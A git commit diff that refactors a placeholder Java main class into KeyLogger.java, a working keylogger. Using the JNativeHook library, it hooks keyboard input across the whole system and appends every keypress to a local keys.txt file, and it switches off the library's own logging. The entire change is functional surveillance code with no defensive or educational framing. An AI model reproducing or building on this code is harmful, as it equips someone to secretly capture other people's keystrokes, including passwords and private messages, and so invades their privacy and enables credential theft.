2a665aad6150c06c96adc850f362adf1f087a307
Farid kaki <deltaburs@gmail.com>
2025-05-03 23:44:01 +0330

    Refactoore my main file into keylogger file

--- KeyLogger.java
+++ KeyLogger.java
@@ -1,6 +1,58 @@
-public class main {
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+/**
+ *
+ * @author toor
+ */
+public class KeyLogger implements NativeKeyListener{
+
+    private FileWriter writer;
+
+    public KeyLogger() {
+        try {
+            writer = new FileWriter("keys.txt", true);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        try {
+            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\n");
+            writer.flush();
+        } catch (IOException ex) {
+            ex.printStackTrace();
+        }
+    }
 
     public static void main(String[] args) {
-        System.out.println("Testing");
+        // حذف لاگ‌های JNativeHook
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        GlobalScreen.addNativeKeyListener(new KeyLogger());
+    }
+
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent nke) {
+        throw new UnsupportedOperationException("Not supported yet."); // Generated from nbfs://nbhost/SystemFileSystem/Templates/Classes/Code/GeneratedMethodBody
+    }
+
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent nke) {
+        throw new UnsupportedOperationException("Not supported yet."); // Generated from nbfs://nbhost/SystemFileSystem/Templates/Classes/Code/GeneratedMethodBody
     }
 }
